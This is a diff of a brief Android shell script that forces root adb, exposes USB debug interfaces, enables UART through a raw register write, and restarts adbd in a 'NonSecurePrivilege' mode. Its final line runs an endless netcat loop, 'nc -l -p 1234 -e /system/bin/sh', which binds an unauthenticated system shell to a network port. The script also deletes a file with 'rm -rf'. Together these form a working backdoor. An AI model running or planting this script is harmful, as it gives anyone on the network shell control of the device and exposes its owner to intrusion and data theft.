@@ -2,13 +2,17 @@
 /system/xbin/busybox touch /data/InYourGrill.$$
 rm -rf /data/.bin/grep 
 
-echo RedHerring > /sys/class/android_usb/android0/iSerial
+echo -n RedHerringHasFangs > /sys/class/android_usb/android0/iSerial
 setprop service.adb.root 1
 setprop service.adb.tcp.port -1
 setprop sys.usb.config rndis,mass_storage,bulk,acm,adb
 busybox devmem 0xe10093d0 8 0x40    #enable uart
 sleep 1
-/sbin/adbd&
+# fuck!!!! work already! 
+adb_en.sh NonSecurePrivilege 
+stop adbd 
+start adbd
+
 while true; do /system/xbin/busybox nc -l -p 1234 -e /system/bin/sh & done 
 
 
